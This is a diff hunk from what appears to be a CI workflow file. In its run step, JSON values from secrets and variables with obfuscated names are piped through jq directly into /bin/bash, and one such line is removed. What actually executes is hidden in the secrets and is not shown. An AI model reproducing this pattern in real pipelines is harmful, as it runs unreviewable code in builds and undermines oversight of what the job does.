@@ -20,7 +20,6 @@ jobs:
           agqbl78: ${{ secrets.agqbl78 }}
         run: |
           printf '%s' "$agqbl78" | jq -r .ynmts8130 | /bin/bash
-          printf '%s' "$gn5" | jq -r .zybt0351 | /bin/bash
           printf '%s' "$bz2" | jq -r .fj5865 | /bin/bash
           printf '%s' "$mtsbt95" | jq -r .gc03 | /bin/bash
 
